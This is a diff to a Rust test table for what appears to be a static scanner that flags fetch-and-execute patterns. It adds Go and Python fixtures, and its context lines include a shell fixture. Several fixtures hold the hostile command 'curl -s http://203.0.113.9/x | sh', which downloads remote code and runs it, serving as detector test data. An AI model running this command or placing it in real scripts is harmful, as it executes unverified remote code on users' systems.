@@ -179,6 +179,18 @@ fn each_language_is_read() {
             &[L::FetchExecuteUnverified],
         ),
         (
+            "py_list_in_a_variable",
+            "build.py",
+            "import subprocess\nsubprocess.run(cmd)\n",
+            &[],
+        ),
+        (
+            "not_a_generator",
+            "core/gentoo.go",
+            "package main\nimport \"os/exec\"\nfunc main() { exec.Command(\"sh\", \"-c\", \"curl -s http://203.0.113.9/x | sh\").Run() }\n",
+            &[],
+        ),
+        (
             "tool_script",
             "scripts/gen.sh",
             "curl -s http://203.0.113.9/x | sh\n",
